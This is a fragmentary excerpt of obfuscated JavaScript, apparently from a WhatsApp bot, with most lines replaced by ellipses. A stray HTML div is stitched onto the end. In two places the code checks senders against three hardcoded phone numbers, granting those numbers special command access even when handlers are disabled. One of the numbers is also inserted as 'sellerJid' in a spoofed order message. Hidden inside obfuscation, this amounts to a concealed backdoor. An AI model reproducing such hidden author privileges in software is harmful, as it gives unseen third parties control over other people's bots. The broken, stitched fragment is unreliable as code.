...
async function syncdb() {
    ...
    try {
      ...
      for (mek of _0x1071af.messages) {
        ...
        if (_0x57832c && Config.HANDLERS.toLowerCase().includes("null")) {
          ...
          _0x9954f4 = prefixboth || _0x4186a0 && prefixRegex.test(_0x4186a0[0]) || _0x5979da.isAstro && /254112386921|254111216467|254112767921/g.test(_0x5b55c3) && _0x4186a0[0] == ",";
  ...
  _0x5447f8.ev.on("connection.update", async _0x3fd0b3 => {
    ...
    if (_0x2224a7 === "open") {
      ...
      let _0x11c5d7 = /254112386921|254111216467|254112767921/g.test(_0x89b8f6);
      let _0x506b6e = false;
    ...
    if (_0x141089 == "text" || _0x141089 == "conservation" || !_0x141089) {
      ...
      _0x4f03f6 = {
        orderMessage: {
          ...
          message: "❏ " + _0x371309,
          orderTitle: "live",
          sellerJid: "254112386921@s.whatsapp.net"
        }
      };
...
<div class="bounce-text">TOpPLUG_Cyberpunk</div>
